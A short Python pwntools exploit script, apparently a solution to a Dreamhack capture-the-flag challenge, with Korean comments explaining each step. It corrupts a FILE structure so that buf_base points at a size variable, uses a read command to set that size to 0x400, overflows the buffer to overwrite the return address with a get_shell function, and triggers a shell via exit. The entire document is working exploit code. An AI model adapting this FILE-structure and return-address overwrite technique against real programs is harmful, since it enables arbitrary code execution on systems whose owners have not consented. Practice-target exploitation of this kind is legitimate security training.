from pwn import *

p = remote('host3.dreamhack.games', 21733)


size_addr = 0x602010 #size변수 주소
get_shell = 0x4009fa #get_shell함수 주소
buf_addr = 0x602040 #buf addr

#file구조체 조작을 통해 buf_base를 size의 주소로 조작
payload = p64(0x00007ffff7e038e0)
payload += p64(size_addr) * 7

p.sendlineafter('#', 'printf' + payload)

#fgets가 stdin을 사용한다는 점을 이용해 size의 값을 원하는 대로 조작
p.sendlineafter('#', 'read')
p.sendline(p64(0x400)) #size의 값을 400으로 조작

#ret주소를 get_shell주소로 바꾸기
payload2 = b'A'*220 + b'B' * 8 + p64(get_shell)
p.sendlineafter('#', payload2)

#exit으로 ret실행
p.sendlineafter('#', 'exit')
p.interactive()



